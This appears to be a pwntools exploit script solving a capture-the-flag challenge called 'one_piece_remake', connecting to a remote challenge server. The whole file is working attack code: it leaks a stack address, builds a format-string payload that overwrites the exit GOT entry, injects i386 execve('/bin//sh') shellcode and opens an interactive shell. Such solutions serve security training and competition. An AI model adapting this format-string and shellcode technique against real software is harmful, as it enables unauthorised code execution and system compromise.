#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./one_piece_remake")

context.binary = exe


def conn():
        return process([exe.path])


def mugiwara(r, shellcode):
    r.sendlineafter(">>", "gomugomunomi")
    r.sendlineafter(">>", shellcode)

def main():
#    r = conn()
    r = remote("onepiece.fword.wtf", 1236)

    mugiwara(r, b"M"*8)
    r.recv(4 + 8)

    stack = u32(r.recv(4))
    log.info("Stack leak @ 0x%x", stack)

    shellcode_addr = stack - 0x2590 + 0x8
    offset = 7
    payload = fmtstr_payload(offset, {exe.got['exit']:shellcode_addr})

    shellcode = asm("""
    
    push 1752379183
    push 1852400175
    xor edx, edx
    xor ecx, ecx
    mov ebx, esp
    mov eax, 0xb
    int 0x80

    """)

#    shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
    shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
    full_shellcode = b"\x90"*(100 - len(shellcode))
    full_shellcode += shellcode
    print(payload)
    print(len(payload))
    print("shellcode = ", shellcode)
    full_payload = payload
    

    #gdb.attach(r)

    mugiwara(r, full_payload)
    
    mugiwara(r, cyclic_metasploit(68) + shellcode)

    sleep(1)

    r.sendline("exit")

    r.interactive()


if __name__ == "__main__":
    main()
